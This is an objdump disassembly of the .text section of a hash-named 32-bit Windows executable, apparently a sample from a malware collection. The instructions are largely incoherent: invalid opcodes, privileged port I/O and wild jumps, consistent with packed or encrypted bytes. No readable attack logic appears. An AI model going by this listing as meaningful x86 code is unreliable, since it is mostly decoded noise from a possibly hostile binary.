
5a7400ea9e8fd51519123c5c47f2b9db94ebb62546c8a5054d269e5024066e57.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	es fs mov bh,0x54
  411004:	mov    edi,0xdc584f75
  411009:	sub    eax,0xa6c02065
  41100e:	sbb    al,0xe9
  411010:	imul   eax,DWORD PTR [edx],0x32
  411013:	out    0x2,al
  411015:	out    dx,al
  411016:	jg     0x41104c
  411018:	cdq    
  411019:	repz rcr DWORD PTR [edi+eiz*4-0x5e],1
  41101e:	xlat   BYTE PTR ds:[ebx]
  41101f:	add    BYTE PTR [eax],0x4e
  411022:	aas    
  411023:	rol    DWORD PTR [esi-0x61678757],cl
  411029:	imul   DWORD PTR [edi]
  41102b:	data16 out 0x67,al
  41102e:	jg     0x411028
  411030:	mov    cl,BYTE PTR [ebx+0x652b34de]
  411036:	lahf   
  411037:	icebp  
  411038:	(bad)  
  411039:	xchg   esp,eax
  41103a:	(bad)  
  41103b:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41103d:	jnp    0x411063
  41103f:	repz or eax,0x36830918
  411045:	jle    0x41104f
  411047:	(bad)  
  411048:	mov    eax,ds:0x7fef31d
  41104d:	push   ebp
  41104e:	call   DWORD PTR [ebp-0x12880796]
  411054:	popf   
  411055:	mov    edx,0x1caf3988
  41105a:	cmp    dl,ch
  41105c:	pushaw 
  41105e:	bound  eax,QWORD PTR [edi-0x21]
  411061:	hlt    
  411062:	shr    edx,cl
  411064:	sbb    eax,0x5cd79d21
  411069:	outs   dx,DWORD PTR ds:[esi]
  41106a:	in     eax,dx
  41106b:	imul   edx,DWORD PTR [ecx],0xffffff82
  41106e:	or     ebp,DWORD PTR [edx+0x7d]
  411071:	mov    edi,0xc5309ec4
  411076:	cmp    bh,BYTE PTR [esi]
  411078:	das    
  411079:	int3   
  41107a:	lods   eax,DWORD PTR ds:[esi]
  41107b:	fwait
  41107c:	adc    DWORD PTR ds:0xc43cfef3,esi
  411082:	or     cl,bl
  411084:	push   edx
  411085:	inc    ecx
  411086:	jg     0x411033
  411088:	mov    esp,0xf653950c
  41108d:	rcl    DWORD PTR [ecx+0x30931213],cl
  411093:	adc    dl,dh
  411095:	pop    edi
  411096:	adc    bl,BYTE PTR ds:0x6ed3baaf
  41109c:	jo     0x41108c
  41109e:	repz fdiv QWORD PTR ds:[ebp+0x53]
  4110a3:	ret    
  4110a4:	or     esi,DWORD PTR [ebx+0x5aa3c2cf]
  4110aa:	mov    ds:0x36667289,eax
  4110af:	aas    
  4110b0:	sahf   
  4110b1:	jo     0x41109c
  4110b3:	inc    ebx
  4110b4:	mov    ebx,esi
  4110b6:	cli    
  4110b7:	inc    esp
  4110b8:	adc    ebp,DWORD PTR [edi]
  4110ba:	gs mov edx,0x4f6cf636
  4110c0:	(bad)  
  4110c1:	jbe    0x4110d1
  4110c3:	mov    ah,0xad
  4110c5:	pop    ecx
  4110c6:	mov    WORD PTR [ebx],?
  4110c8:	pop    ds
  4110c9:	pop    esp
  4110ca:	lods   eax,DWORD PTR ds:[esi]
  4110cb:	sub    BYTE PTR [ecx+0x1f65d458],cl
  4110d1:	pop    esi
  4110d2:	fwait
  4110d3:	push   esi
  4110d4:	clc    
  4110d5:	(bad)
  4110d8:	dec    esp
  4110d9:	inc    eax
  4110da:	push   0xde495020
  4110df:	daa    
  4110e0:	pop    eax
  4110e1:	cmp    BYTE PTR [esi+esi*2-0x335ede71],cl
  4110e8:	scas   al,BYTE PTR es:[edi]
  4110e9:	aaa    
  4110ea:	idiv   bh
  4110ec:	mov    eax,ds:0x33649a38
  4110f1:	push   ecx
  4110f2:	rcl    BYTE PTR [esi-0x29c91b27],1
  4110f8:	mov    bl,0x18
  4110fa:	dec    esi
  4110fb:	int3   
  4110fc:	fisubr WORD PTR [eax]
  4110fe:	das    
  4110ff:	adc    eax,0x2e403f14
  411104:	sbb    BYTE PTR [ecx],dl
  411106:	add    DWORD PTR [edi-0x69b4cc2a],edi
  41110c:	add    BYTE PTR [ecx+0x229925b7],bh
  411112:	cld    
  411113:	rcr    DWORD PTR [esi*1+0x454dc013],1
  41111a:	(bad)  
  41111b:	ret    0x565a
  41111e:	ja     0x411183
  411120:	and    edx,ebp
  411122:	xlat   BYTE PTR ds:[ebx]
  411123:	nop
  411124:	retf   0x808f
  411127:	ins    DWORD PTR es:[edi],dx
  411128:	inc    esp
  411129:	ror    BYTE PTR [eax+0x16],1
  41112c:	pop    ss
  41112d:	cmp    al,0xe1
  41112f:	inc    esp
  411130:	shr    BYTE PTR [edi-0x7af5e049],1
  411136:	cli    
  411137:	(bad)  
  411138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411139:	in     eax,0x53
  41113b:	cmp    ch,BYTE PTR [esi+0x49]
  41113e:	imul   ecx,DWORD PTR [esi+0x48a6bc05],0x8f781ded
  411148:	bound  edi,QWORD PTR [esi+0x77]
  41114b:	push   es
  41114c:	sub    al,0x31
  41114e:	aad    0x11
  411150:	data16 xor bh,al
  411153:	ficomp WORD PTR [eax]
  411155:	shl    DWORD PTR [esi],0x51
  411158:	rol    eax,cl
  41115a:	jmp    0xd17bd8a
  41115f:	inc    ebx
  411160:	adc    ebp,DWORD PTR [edi-0x74]
  411163:	loop   0x4111aa
  411165:	add    al,0xc4
  411167:	sub    ebp,DWORD PTR [ebp+edx*4+0x1ad3f78b]
  41116e:	and    cl,dl
  411170:	and    DWORD PTR [edx+0x22bf7b41],edx
  411176:	sbb    ebp,DWORD PTR [eax]
  411178:	retf   0xb37a
  41117b:	mov    cl,0x7d
  41117d:	test   al,0x58
  41117f:	into   
  411180:	retf   0x6b28
  411183:	das    
  411184:	jmp    0x6d72:0xc3172445
  41118b:	xchg   ebx,eax
  41118c:	dec    ecx
  41118d:	out    dx,eax
  41118e:	arpl   bx,ax
  411190:	mov    BYTE PTR [esi+0x41],ah
  411193:	add    al,0x3
  411195:	imul   ecx,ebx,0x77
  411198:	adc    eax,0x9f9d3740
  41119d:	dec    ebx
  41119e:	xchg   esp,eax
  41119f:	xor    DWORD PTR [eax-0x5c],ecx
  4111a2:	add    BYTE PTR [edi],0xf7
  4111a5:	mov    eax,0xed63bd42
  4111aa:	test   eax,0xf401162f
  4111af:	popf   
  4111b0:	mov    esi,0xc2f52541
  4111b6:	inc    esp
  4111b7:	rol    ebx,1
  4111b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ba:	les    ecx,FWORD PTR [eax-0x5478474b]
  4111c0:	inc    ecx
  4111c1:	xchg   edx,eax
  4111c2:	call   ecx
  4111c4:	xor    al,BYTE PTR [ecx-0x563857d]
  4111ca:	(bad)  
  4111cc:	xchg   esi,eax
  4111cd:	mov    BYTE PTR [edx],0xeb
  4111d0:	push   ecx
  4111d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d2:	adc    ah,cl
  4111d4:	and    DWORD PTR [eax-0x4c],ebx
  4111d7:	cld    
  4111d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d9:	lahf   
  4111da:	mov    ds:0x99bf50a5,al
  4111df:	cmp    DWORD PTR [edi],eax
  4111e1:	(bad)  
  4111e2:	push   edx
  4111e3:	aas    
  4111e4:	mov    al,0x4b
  4111e6:	fldpi  
  4111e8:	in     eax,dx
  4111e9:	je     0x411249
  4111eb:	push   edi
  4111ec:	pop    ebx
  4111ed:	daa    
  4111ee:	out    dx,al
  4111ef:	mov    ?,WORD PTR [eax+0x53]
  4111f2:	jl     0x411205
  4111f4:	xchg   ecx,eax
  4111f5:	xchg   esp,eax
  4111f6:	das    
  4111f7:	neg    DWORD PTR [esi+0x6891beb4]
  4111fd:	push   0x2af57749
  411202:	lahf   
  411203:	sti    
  411204:	push   ss
  411205:	sub    DWORD PTR [ecx],ebx
  411207:	push   es
  411208:	dec    BYTE PTR [ebx]
  41120a:	mov    ebp,0x73639f0c
  41120f:	add    eax,0x7742cc70
  411214:	repz xor dh,BYTE PTR [edi+0x7232ad1a]
  41121b:	arpl   dx,si
  41121d:	sbb    BYTE PTR [edx],dl
  41121f:	leave  
  411220:	cmp    al,dl
  411222:	xor    eax,0xef5442cb
  411227:	xor    al,0xd3
  411229:	(bad)  
  41122a:	pop    edi
  41122b:	mov    cl,0xdf
  41122d:	sti    
  41122e:	fisttp DWORD PTR [esi-0x5bcd2176]
  411234:	and    ebx,ecx
  411236:	mov    ecx,0x4ca50561
  41123b:	inc    eax
  41123c:	dec    ebp
  41123d:	rcr    edx,1
  41123f:	sub    dh,dl
  411241:	sbb    cl,BYTE PTR [ecx-0x2f9fe7a0]
  411247:	cs sbb al,0xf9
  41124a:	int3   
  41124b:	jns    0x4111ea
  41124d:	lods   al,BYTE PTR ds:[esi]
  41124e:	mov    ebp,0x3793f3bb
  411253:	popa   
  411254:	int3   
  411255:	clc    
  411256:	icebp  
  411257:	cld    
  411258:	xchg   ebx,eax
  411259:	cmp    al,0xce
  41125b:	or     ch,BYTE PTR [edx+ebx*2]
  41125e:	cdq    
  41125f:	xchg   ebx,eax
  411260:	sar    DWORD PTR [esi-0x42bc969e],cl
  411266:	lods   eax,DWORD PTR ds:[esi]
  411267:	out    0xe0,eax
  411269:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41126a:	lods   al,BYTE PTR ds:[esi]
  41126b:	fcom   QWORD PTR [edx+0x1e]
  41126e:	mov    ch,0x80
  411270:	pop    ebx
  411271:	into   
  411272:	jno    0x411275
  411274:	loop   0x41128a
  411276:	in     al,0xc2
  411278:	mov    eax,0x611eed52
  41127d:	popf   
  41127e:	imul   ecx,DWORD PTR [ebx+ecx*4+0x4d45599a],0x83967a73
  411289:	retf   
  41128a:	dec    ebp
  41128b:	inc    esp
  41128c:	je     0x41129e
  41128e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41128f:	cli    
  411290:	out    0xf8,eax
  411292:	add    BYTE PTR [esi+0x1c5c21ca],ch
  411298:	fsubrp st(1),st
  41129a:	pop    ecx
  41129b:	leave  
  41129c:	cld    
  41129d:	push   edx
  41129e:	push   es
  41129f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a0:	(bad)  [ecx+0x32e4c1f1]
  4112a6:	or     DWORD PTR [edx+0x58],esi
  4112a9:	and    esi,0x19
  4112ac:	add    ah,ch
  4112ae:	(bad)  [esi-0x7f]
  4112b1:	add    al,0xe
  4112b3:	ror    BYTE PTR [edx+0x6f1b5a1f],cl
  4112b9:	or     eax,0x6ad7520d
  4112be:	daa    
  4112bf:	leave  
  4112c0:	popf   
  4112c1:	pop    ss
  4112c2:	xchg   BYTE PTR ds:[ecx-0xbba3e97],bl
  4112c9:	dec    ecx
  4112ca:	sub    DWORD PTR [eax],edx
  4112cc:	push   ss
  4112cd:	cs fcmovne st,st(5)
  4112d0:	push   cs
  4112d1:	fs stos BYTE PTR es:[edi],al
  4112d3:	and    BYTE PTR [eax-0x5a],bh
  4112d6:	mov    ch,0x39
  4112d8:	cmc    
  4112d9:	mov    es:0x680af687,eax
  4112df:	out    dx,al
  4112e0:	call   0xb040486f
  4112e5:	and    dh,BYTE PTR [esi-0x4a]
  4112e8:	mov    ecx,0xa928c8f
  4112ed:	stos   BYTE PTR es:[edi],al
  4112ee:	adc    ah,0x16
  4112f1:	push   ebx
  4112f2:	xor    ch,cl
  4112f4:	repnz (bad) 
  4112f6:	rcr    DWORD PTR [edx-0x7fe8d6c2],1
  4112fc:	outs   dx,DWORD PTR ds:[esi]
  4112fd:	push   esp
  4112fe:	pop    ecx
  4112ff:	dec    eax
  411300:	scas   eax,DWORD PTR es:[edi]
  411301:	ins    DWORD PTR es:[edi],dx
  411302:	test   eax,0x8d4b3f87
  411307:	cdq    
  411308:	sbb    al,0xa3
  41130a:	inc    al
  41130c:	cmp    eax,0xd326b97d
  411311:	fisttp WORD PTR [edi-0xb946968]
  411317:	mov    ah,0xfc
  411319:	imul   edx,DWORD PTR [edi],0x5daa1214
  41131f:	cmp    DWORD PTR es:[ebx],eax
  411322:	add    DWORD PTR [ecx+0x38],ecx
  411325:	repz and al,0xd4
  411328:	fild   DWORD PTR [ecx-0x3dae1959]
  41132e:	hlt    
  41132f:	xor    eax,0x850d1c31
  411334:	jecxz  0x4113b2
  411336:	out    dx,al
  411337:	pop    esp
  411338:	fisubr DWORD PTR [esi-0x4a]
  41133b:	int3   
  41133c:	jmp    0x4112c9
  41133e:	hlt    
  41133f:	sub    edi,DWORD PTR [esi+0x3722717f]
  411345:	dec    edi
  411346:	jmp    0x411317
  411348:	inc    edx
  411349:	push   ss
  41134a:	push   ebx
  41134b:	retf   0xc8c0
  41134e:	mov    esp,0xff20f428
  411353:	(bad)  
  411354:	int    0xb6
  411356:	sahf   
  411357:	sub    eax,0x26f0d2f8
  41135c:	xor    dl,BYTE PTR [ebp+0x583b93d6]
  411362:	adc    edi,DWORD PTR [ebx-0x3268f87f]
  411368:	cs jns 0x4113da
  41136b:	dec    edx
  41136c:	inc    eax
  41136d:	test   DWORD PTR ds:0xbfbd805f,esi
  411373:	mov    dl,0x15
  411375:	bound  esi,QWORD PTR [ebx+0xfb3a030]
  41137b:	adc    eax,0x39937bb5
  411380:	push   0x15
  411382:	mov    ds:0x5eacdd29,eax
  411387:	sbb    BYTE PTR [ebp-0x725533e3],ah
  41138d:	push   ebp
  41138e:	lods   al,BYTE PTR ds:[esi]
  41138f:	ss lahf 
  411391:	push   cs
  411392:	pop    esi
  411393:	push   eax
  411394:	lahf   
  411395:	(bad)  
  411396:	out    0xa,eax
  411398:	popa   
  411399:	xchg   ecx,eax
  41139a:	outs   dx,BYTE PTR ds:[esi]
  41139b:	jae    0x41134e
  41139d:	xchg   ebx,eax
  41139e:	push   esp
  41139f:	cmp    DWORD PTR [ebx-0x3bb86ddc],0x60988dd5
  4113a9:	mov    ebx,0x8599d768
  4113ae:	(bad)  
  4113af:	pop    edx
  4113b0:	cwde   
  4113b1:	xor    bh,BYTE PTR [esi-0x5153b747]
  4113b7:	and    BYTE PTR [esi+0x9],dh
  4113ba:	out    dx,al
  4113bb:	mov    esi,0xb9d23101
  4113c0:	add    dh,dl
  4113c2:	lods   eax,DWORD PTR ds:[esi]
  4113c3:	pop    edx
  4113c4:	adc    al,0x2e
  4113c7:	out    dx,eax
  4113c8:	or     BYTE PTR [eax+0x4aba6cec],cl
  4113ce:	or     BYTE PTR ss:[edx-0x44],0x52
  4113d3:	mov    ebx,0x469b0f8b
  4113d8:	mov    esi,0x46c9c75a
  4113dd:	and    al,BYTE PTR [ebp-0x36aa45fc]
  4113e3:	sub    edx,ebp
  4113e5:	sbb    BYTE PTR [ecx+0x4e6e29f4],ah
  4113eb:	jbe    0x411407
  4113ed:	sbb    eax,0xf0329e6c
  4113f2:	ds jg  0x4113ce
  4113f5:	hlt    
  4113f6:	mov    edi,0x1f91048b
  4113fb:	jbe    0x41146d
  4113fd:	push   ebp
  4113fe:	retf   0xe317
  411401:	lahf   
  411402:	ss mov dh,0x94
  411405:	sbb    edx,DWORD PTR [ecx+0x1d]
  411408:	ds in  eax,dx
  41140a:	mov    dl,0x33
  41140c:	ret    
  41140d:	mov    edi,0x610bbb66
  411412:	pop    edx
  411413:	xchg   ebp,eax
  411414:	cmp    BYTE PTR [esi-0x3d1031dd],0x8e
  41141b:	push   edi
  41141c:	or     DWORD PTR [esi+0x4c],0x1eca3e20
  411423:	scas   eax,DWORD PTR es:[edi]
  411424:	or     eax,ecx
  411426:	cld    
  411427:	out    dx,eax
  411428:	dec    edx
  411429:	outs   dx,DWORD PTR ds:[esi]
  41142a:	test   BYTE PTR ss:[eax],cl
  41142d:	mov    eax,ds:0xadb5520b
  411432:	fild   QWORD PTR [esi-0x6d]
  411435:	sahf   
  411436:	cmp    cl,BYTE PTR [edi]
  411438:	mov    ch,0x3
  41143a:	push   esp
  41143b:	push   ebx
  41143c:	adc    ecx,DWORD PTR [esi+0x2b5a3a9b]
  411442:	pop    edi
  411443:	jp     0x4114b1
  411445:	dec    esi
  411446:	pop    ebp
  411447:	cwde   
  411448:	inc    ebx
  411449:	or     edx,edi
  41144b:	fwait
  41144c:	xor    ebp,DWORD PTR ds:0xab765a1c
  411452:	nop
  411453:	jae    0x4114a2
  411455:	mov    cl,0xaa
  411457:	pcmpgtd mm4,QWORD PTR [esi]
  41145a:	das    
  41145b:	inc    esp
  41145c:	mov    esi,0x974c87b8
  411461:	loopne 0x411471
  411463:	sbb    dh,BYTE PTR [ecx+0xcc7fb7e]
  411469:	push   ds
  41146a:	push   ebx
  41146b:	lods   al,BYTE PTR ds:[esi]
  41146c:	loop   0x411474
  41146e:	mov    bh,BYTE PTR [edx-0x46c58f6f]
  411474:	xchg   ebp,eax
  411475:	mov    bh,BYTE PTR [eax]
  411477:	add    al,0xe3
  411479:	sbb    al,0x2b
  41147b:	leave  
  41147c:	jmp    0xd8df:0x3ab29233
  411483:	xor    ah,al
  411485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411486:	mov    esi,0x7678903c
  41148b:	ins    DWORD PTR es:[edi],dx
  41148c:	adc    BYTE PTR [edx],0x16
  41148f:	cmp    dl,BYTE PTR [esi+0xe]
  411492:	jbe    0x41146b
  411494:	lods   al,BYTE PTR ds:[esi]
  411495:	into   
  411496:	push   ds
  411497:	dec    ebp
  411498:	sub    edx,DWORD PTR [eax+0x311b02e2]
  41149e:	(bad)  
  41149f:	pop    esp
  4114a0:	cmp    BYTE PTR [ebp+ebp*8+0x53],0xd7
  4114a5:	fbld   TBYTE PTR [edx+0x25]
  4114a8:	mov    dh,0x3a
  4114aa:	rcl    BYTE PTR [esi+0x48938df4],1
  4114b0:	cmp    DWORD PTR [ecx],edi
  4114b2:	push   edi
  4114b3:	pop    ecx
  4114b4:	cmp    BYTE PTR [edi],ch
  4114b6:	js     0x41148c
  4114b8:	clc    
  4114b9:	lods   eax,DWORD PTR ds:[esi]
  4114ba:	pushf  
  4114bb:	mov    ebp,0xfd40133d
  4114c0:	add    esi,ecx
  4114c2:	pop    eax
  4114c3:	hlt    
  4114c4:	and    bh,BYTE PTR [ebx+ebp*1+0x11c89e99]
  4114cb:	xchg   ebx,eax
  4114cc:	and    edx,DWORD PTR [edx+0x358bba5d]
  4114d2:	add    dh,BYTE PTR [edx-0x67]
  4114d5:	mov    dl,0x73
  4114d7:	sub    al,al
  4114d9:	pusha  
  4114da:	sbb    edx,DWORD PTR [edi+0x174ea8f7]
  4114e0:	das    
  4114e1:	pop    esp
  4114e2:	push   ebx
  4114e3:	push   edi
  4114e4:	add    al,0x5c
  4114e6:	jg     0x4114e5
  4114e8:	xor    BYTE PTR [esi+0x4e],0xf6
  4114ec:	(bad)  
  4114ee:	adc    al,0x7d
  4114f0:	jmp    0x600070b9
  4114f5:	pop    esi
  4114f6:	adc    BYTE PTR ss:[ebp+0x4c],dh
  4114fa:	inc    eax
  4114fb:	lea    ecx,[eax+edx*4]
  4114fe:	sub    ebp,DWORD PTR [edi+0x7e]
  411501:	jo     0x411541
  411503:	icebp  
  411504:	jno    0x411493
  411506:	(bad)  
  411507:	sub    eax,0x731c83b6
  41150c:	or     ebp,DWORD PTR [edx-0x40]
  41150f:	repnz xchg ebp,eax
  411511:	push   edi
  411512:	push   ebp
  411513:	mov    al,BYTE PTR [edi]
  411515:	jno    0x411527
  411517:	in     eax,0x96
  411519:	add    bl,cl
  41151b:	dec    edx
  41151c:	dec    eax
  41151d:	cmp    al,0x26
  41151f:	int    0xae
  411521:	xor    BYTE PTR [esi+eax*8-0xf3119f],0xfd
  411529:	mov    esi,esp
  41152b:	fldcw  WORD PTR [eax+0x3]
  41152e:	pushf  
  41152f:	mov    ds:0xa0d8a86c,eax
  411534:	(bad)  
  411535:	jne    0x41150d
  411537:	lahf   
  411538:	inc    esi
  411539:	jnp    0x411599
  41153b:	nop
  41153c:	stos   BYTE PTR es:[edi],al
  41153d:	mov    ds:0x59fbc825,al
  411542:	scas   al,BYTE PTR es:[edi]
  411543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411544:	push   ecx
  411545:	fist   WORD PTR [edi+0x68]
  411548:	data16 into 
  41154a:	pusha  
  41154b:	fwait
  41154c:	popf   
  41154d:	outs   dx,DWORD PTR ds:[esi]
  41154e:	inc    esi
  41154f:	ror    cl,1
  411551:	scas   eax,DWORD PTR es:[edi]
  411552:	loopne 0x411506
  411554:	adc    BYTE PTR [ebx-0x78],al
  411557:	ja     0x41157a
  411559:	out    0xf1,eax
  41155b:	mov    ss:0x7c0bf05d,al
  411561:	mov    al,ds:0x150c3b8c
  411566:	dec    edi
  411567:	and    bh,BYTE PTR [esi+0x35]
  41156a:	lods   al,BYTE PTR ds:[esi]
  41156b:	int    0x86
  41156d:	and    BYTE PTR [esi+0xda19894],ah
  411573:	in     al,0xe6
  411575:	mov    dh,0x28
  411577:	jge    0x41156a
  411579:	jbe    0x4115b1
  41157b:	xlat   BYTE PTR es:[ebx]
  41157d:	cmp    esi,DWORD PTR [eax]
  41157f:	mov    edx,DWORD PTR [eax-0x5055706a]
  411585:	mov    dh,0x66
  411587:	push   0x5
  411589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158a:	(bad)  
  41158b:	loop   0x4115a1
  41158d:	stc    
  41158e:	cmp    esi,DWORD PTR [eax+0x22]
  411591:	xor    DWORD PTR [ecx+esi*4],0xfffffff3
  411595:	cmp    DWORD PTR ds:0xf8a0cc21,esi
  41159b:	stos   DWORD PTR es:[edi],eax
  41159c:	in     eax,0xe8
  41159e:	lods   eax,DWORD PTR ds:[esi]
  41159f:	sub    BYTE PTR ds:0x9b5c7801,bl
  4115a5:	jbe    0x41159a
  4115a7:	out    0x68,al
  4115a9:	(bad)  
  4115aa:	or     ebx,ebx
  4115ac:	inc    ecx
  4115ad:	mov    dl,0x22
  4115af:	dec    eax
  4115b0:	mov    ecx,DWORD PTR [ebx-0x18758f58]
  4115b6:	and    al,0x78
  4115b8:	xchg   esi,eax
  4115b9:	jbe    0x4115a3
  4115bb:	mov    esi,0x8c26c75c
  4115c0:	(bad)  
  4115c1:	enter  0xf248,0xf
  4115c5:	xchg   ebx,eax
  4115c6:	inc    ecx
  4115c7:	push   ebx
  4115c8:	push   cs
  4115c9:	push   ebp
  4115ca:	xor    eax,DWORD PTR [edi-0x3ce5c160]
  4115d0:	or     DWORD PTR [edi+0x6b],esi
  4115d3:	dec    esi
  4115d4:	ins    BYTE PTR es:[edi],dx
  4115d5:	enter  0xbeb8,0xba
  4115d9:	xor    dl,BYTE PTR [ebp+eiz*4-0x24]
  4115dd:	mov    ?,WORD PTR [edx+0x1d]
  4115e0:	inc    esi
  4115e1:	popf   
  4115e2:	add    al,0x71
  4115e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115e5:	xchg   ecx,eax
  4115e6:	mov    dl,0xb0
  4115e8:	imul   ecx,esi,0xffffffa9
  4115eb:	mov    ecx,0x7a6947e7
  4115f0:	stos   DWORD PTR es:[edi],eax
  4115f1:	sbb    DWORD PTR [ebx-0x6d13c0b7],eax
  4115f7:	dec    esp
  4115f8:	adc    eax,DWORD PTR [ecx+0x45f7cb80]
  4115fe:	jne    0x4115c6
  411600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411601:	jae    0x4115fd
  411603:	mov    bl,0x2d
  411605:	mov    ah,0xc4
  411607:	test   al,0xcd
  411609:	jle    0x411595
  41160b:	cmp    edi,DWORD PTR [esi+0x765196a7]
  411611:	out    dx,al
  411612:	repnz push cs
  411614:	pop    ss
  411615:	ds push ss
  411617:	jmp    0xcd6d:0x936b1c29
  41161e:	xlat   BYTE PTR ds:[ebx]
  41161f:	mov    esi,esp
  411621:	push   ecx
  411622:	cmp    BYTE PTR [edx+0x10],bh
  411625:	pop    edx
  411626:	iret   
  411627:	std    
  411628:	xchg   DWORD PTR [esi],eax
  41162a:	(bad)  
  41162b:	sub    ah,BYTE PTR [esi]
  41162d:	stos   BYTE PTR es:[edi],al
  41162e:	adc    DWORD PTR [esp+eax*8+0x88127b],0xfffffff4
  411636:	out    dx,al
  411637:	add    dh,BYTE PTR [edi]
  411639:	add    ch,BYTE PTR [edi]
  41163b:	adc    BYTE PTR [edx-0x539ce575],bl
  411641:	mov    dh,0x3b
  411643:	out    dx,al
  411644:	inc    edx
  411645:	mov    ds:0x4b12f71,eax
  41164a:	dec    esp
  41164b:	out    0x2f,al
  41164d:	mov    dl,0xc9
  41164f:	xchg   ebx,eax
  411650:	test   BYTE PTR [edx+0x3f],al
  411653:	pop    esp
  411654:	cmp    al,0x52
  411656:	fs cdq 
  411658:	adc    al,0x2c
  41165a:	mov    WORD PTR [ecx+0x15],fs
  41165d:	dec    edx
  41165e:	adc    al,BYTE PTR [ecx-0x1e155172]
  411664:	xchg   esp,eax
  411665:	mov    eax,ds:0xbd43603a
  41166a:	xchg   esi,eax
  41166b:	pop    ss
  41166c:	add    al,0xbf
  41166e:	scas   al,BYTE PTR es:[edi]
  41166f:	sub    DWORD PTR [eax],edx
  411671:	push   ebx
  411672:	push   cs
  411673:	lock mov ebx,0xce6c8e6
  411679:	push   ebx
  41167a:	daa    
  41167b:	or     eax,0xd7fe2102
  411680:	cmp    ecx,0x754d0dae
  411686:	add    eax,0xc5e2ab5c
  41168b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41168c:	push   ds
  41168d:	fbld   TBYTE PTR [eax+0x3c]
  411690:	pop    ebx
  411691:	stc    
  411692:	mov    ds:0x9c1f37b1,al
  411697:	out    0x9e,al
  411699:	jne    0x411634
  41169b:	sahf   
  41169c:	xchg   ebx,ebp
  41169e:	scas   eax,DWORD PTR es:[edi]
  41169f:	repz popa 
  4116a1:	or     BYTE PTR es:[esi+0x7],al
  4116a5:	popf   
  4116a6:	rol    DWORD PTR [edx-0x463d71c],cl
  4116ac:	push   ds
  4116ad:	test   bl,ah
  4116af:	mov    bh,BYTE PTR [edi+ebx*1-0x11]
  4116b3:	cli    
  4116b4:	pop    ds
  4116b5:	shr    esi,1
  4116b7:	in     eax,dx
  4116b8:	aad    0x32
  4116ba:	cld    
  4116bb:	adc    dh,ah
  4116bd:	push   0xffffff8b
  4116bf:	out    dx,eax
  4116c0:	jp     0x41168d
  4116c2:	mov    cl,BYTE PTR [eax+ebp*4]
  4116c5:	adc    al,0xc2
  4116c7:	xor    ch,dh
  4116c9:	pop    ebx
  4116ca:	fs inc edi
  4116cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116cd:	push   0x6997f97d
  4116d2:	fisttp DWORD PTR [ebp+0x45b24213]
  4116d8:	push   esp
  4116d9:	ror    ecx,1
  4116db:	bswap  eax
  4116dd:	repnz cmp BYTE PTR [edi-0xc],al
  4116e1:	jecxz  0x411757
  4116e3:	jae    0x411689
  4116e5:	loopne 0x4116b5
  4116e7:	(bad)  
  4116e9:	mov    fs,edx
  4116eb:	frstor [esp+ebp*4-0x4a4859de]
  4116f2:	sar    BYTE PTR [eax-0x15536c55],0xac
  4116f9:	cmp    ecx,esp
  4116fb:	out    0xfc,al
  4116fd:	and    al,0xaa
  4116ff:	bound  ebp,QWORD PTR [ebp+0x563817dd]
  411705:	sub    eax,0x71d1b3de
  41170a:	or     ch,0xce
  41170d:	sar    DWORD PTR [esp+ebp*4-0x3757ddfd],cl
  411714:	sub    dl,BYTE PTR [edx-0x48]
  411717:	pop    ecx
  411718:	mov    bl,0xfb
  41171a:	sbb    DWORD PTR [ecx],ebp
  41171c:	pop    esi
  41171d:	jmp    0x522d5e34
  411722:	mov    al,BYTE PTR [eax+ebp*1+0x4462b21a]
  411729:	arpl   WORD PTR [edx-0x4b7e4e53],bp
  41172f:	pushf  
  411730:	test   eax,0xf53c41e0
  411735:	jge    0x41178b
  411737:	mov    ebp,0xdc26e3f9
  41173c:	push   0xf70e7d31
  411741:	call   0x38501ea7
  411746:	fwait
  411747:	jo     0x41177f
  411749:	mov    DWORD PTR [eax+0x11],ebp
  41174c:	in     eax,dx
  41174d:	push   ebp
  41174e:	inc    ecx
  41174f:	xchg   ecx,eax
  411750:	shl    BYTE PTR [eax-0x75e6467c],1
  411756:	push   esi
  411757:	jmp    0x41178d
  411759:	arpl   WORD PTR ds:0xf63ed63d,dx
  41175f:	mov    al,0x82
  411761:	push   ss
  411762:	mov    ah,0xdb
  411764:	push   cs
  411765:	shl    DWORD PTR [ebx-0x43bc333e],0x62
  41176c:	cdq    
  41176d:	push   es
  41176e:	scas   eax,DWORD PTR es:[edi]
  41176f:	jecxz  0x4116f5
  411771:	cs addr16 sub esp,0xc0c627be
  411779:	jb     0x41174d
  41177b:	sub    al,0x5b
  41177d:	pop    ss
  41177e:	aad    0x29
  411780:	jb     0x4117e8
  411782:	imul   esp,DWORD PTR [edi-0x4ef11991],0x4a
  411789:	test   al,0xba
  41178b:	jl     0x41171e
  41178d:	int3   
  41178e:	add    eax,0xcb07b079
  411793:	lods   al,BYTE PTR ds:[esi]
  411794:	es jle 0x41178d
  411797:	je     0x4117a7
  411799:	test   al,0x76
  41179b:	push   eax
  41179c:	sar    BYTE PTR [ebx+ebp*8+0x39],1
  4117a0:	lock jmp DWORD PTR [esi-0x46]
  4117a4:	test   eax,0x702fa029
  4117a9:	mov    esp,0x95b8f85d
  4117ae:	adc    ebx,DWORD PTR [ebp+0x45146cbb]
  4117b4:	and    ch,BYTE PTR [edi]
  4117b6:	loop   0x411791
  4117b8:	lahf   
  4117b9:	shl    bh,cl
  4117bb:	lods   eax,DWORD PTR ds:[esi]
  4117bc:	mov    cl,0x98
  4117be:	mov    ds:0xb7237190,eax
  4117c3:	jle    0x411776
